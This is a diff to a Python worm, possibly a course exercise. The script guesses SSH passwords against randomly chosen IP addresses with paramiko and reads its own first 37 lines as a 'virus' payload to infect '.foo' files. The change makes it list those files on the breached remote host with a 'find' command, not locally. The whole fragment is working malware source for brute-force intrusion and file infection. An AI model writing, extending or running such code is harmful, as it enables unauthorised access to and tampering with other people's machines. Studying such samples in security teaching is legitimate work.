@@ -101,17 +101,21 @@ while True:
             # And, finally, loop over randomly chosen IP addresses
             for ip_address in get_fresh_ipaddresses(NHOSTS):
                 print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
-                files_of_interest_at_target = []
+                file_list = []
                 try:
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                     print("\n\nconnected\n")
                     
+                    stdin, stdout, stderr = ssh.exec_command(f"find root/ -type f -name '*.foo'")
+                    for line in stdout:
+                        file_list.append(line.strip())
+
                     IN = open(sys.argv[0], 'r')
                     virus = [line for (i,line) in enumerate(IN) if i < 37]
 
-                    for item in glob.glob("*.foo"):
+                    for item in file_list:
                         IN = open(item, 'r')
                         all_of_it = IN.readlines()
                         IN.close()
